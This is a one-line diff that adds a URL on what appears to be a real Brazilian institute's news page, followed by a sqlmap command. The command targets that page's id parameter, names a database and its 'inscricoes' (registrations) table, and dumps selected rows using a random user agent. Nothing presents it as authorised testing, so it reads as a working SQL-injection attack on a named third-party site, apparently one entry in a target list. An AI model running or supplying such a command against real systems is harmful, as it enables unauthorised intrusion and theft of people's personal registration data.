@@ -1,0 +1,1 @@
+https://www.institutocimas.com.br/noticiasDetalhe.asp?id=217 (GET)  # sqlmap.py -u https://www.institutocimas.com.br/noticiasDetalhe.asp?id=217 -D cimas_insti --threads 5 -v3 --random-agent -T inscricoes --dump --where id=3684
